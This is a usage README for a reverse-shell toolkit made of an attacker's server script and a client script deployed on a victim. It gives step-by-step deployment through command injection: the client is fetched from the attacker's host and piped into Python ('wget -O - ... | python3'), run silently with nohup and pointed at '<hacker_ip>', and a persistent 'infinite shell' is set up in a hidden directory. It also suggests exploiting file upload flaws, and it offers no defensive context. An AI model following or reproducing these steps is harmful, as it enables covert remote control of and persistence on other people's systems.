# Usage

## On Hacking machine
`python3 rs_server.py`
<- edit the file to use the port you want or pass it in as an argument (default 8000). 

## Direct Client Deployment
`python3 rs_client.py`
^ edit the file to use the rs_server IP and port you want. 

Or pass them in as an argumenta (default port 8000)
`python3 rs_client.py <rs_server_ip> <rs_server_port>`

Or run as a backgroud job
`nohup python3 rs_client.py <hacker_ip> &> /dev/null &`

## Indirect Client Deployment \[PREFERRED\]
(works with cmd line injection)

- \[SERVER\] Host rs_client.py somehere
- - One option is to start a python web server on the rs_server
- - `python3 -m http.server 8080`   
- \[CLIENT]\ Download + Execute from client machine
- - `wget -O - <host:port/rs_client.py> | python3`
- \[SERVER\] Download + Execute the Infinite shell (keeps rs_client active if it disconnects)
- - Follow these steps once server is connected to client.
- - Navigate to specific dir or Make a hidden dir
- - - `cd /usr/bin/local`  
- - Download from your rs_server
- - - `wget <host:port/infiniteShell.py>`
- - Run in background witn nohup  
- - - `nohup bash infiniteShell.sh &> /dev/null &`


## Indirect Client Deployment [ALT]
- Could also exploit a file upload vulnerability and upload the file onto the victim's machine


### Port as an optional argument
Both scripts communicate on port 8000 by default.
This can be changed to another port - but you would need to make sure both scripts have the same port..

